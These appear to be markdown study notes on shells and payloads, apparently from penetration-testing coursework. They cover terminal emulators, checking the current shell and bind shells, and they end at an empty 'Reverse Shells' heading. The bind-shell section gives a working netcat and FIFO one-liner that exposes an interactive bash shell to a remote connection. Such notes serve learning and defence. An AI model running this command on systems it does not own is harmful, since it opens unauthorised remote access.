## Shells and Payloads

<br>

### Shells v Payloads 
```
# A shell allows the user to interact with the system typically via a command line interface. Examples of shells are bash, zsh, cmd, and powershell

# Payloads are code designed to carry out a exploit or vulnerability on a system. (ie ransomeware)
```

<br>

### Anatomy of a Shell
```
# All OSs have shells. To interact with the shells you must use a "Terminal Emulator", which simulates a terminal and allows interaction with a systems OS
  1. Windows Terminal, cmder, PuTTY, kitty, alacritty, xterm, GNOME terminal, MATE terminal, konsole, Terminal, iTerm2


# Common Language Interpreter (Not to be confused with CLI - Command Line Interface): Interprets user commands and translates them for the OS to run commands
  1. $ marks the start of a shell prompt 

  2. run the following command to find out what command line interpreter you are using 
    echo $SHELL

```

<br>


### Bind shells 
```
# Bind shell is there the target has a listener setup and the attacker attaches to it 
# The following is just a TCP connection with nc, not a shell
  1. Start nc on remote machine 
    nc -lvnp 7777

  2. Use nc on local machine to attach to listener 
    nc -nv [ip of remote machine] [port]


# Use nc to setup a shell
  1. Create FIFO folder, pipe bash to stdout, setup nc listener and any stdin will be put in the FIFO folder. This command is loop that passes messages from the nc listener into a file that is then pushed into a bash shell and outputted to stdout which is then sent back to the nc listener 
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l [ip] [port] > /tmp/f

  2. Connect to the listener 
    nc -nv [ip] [port]
```

<br>

### Reverse Shells
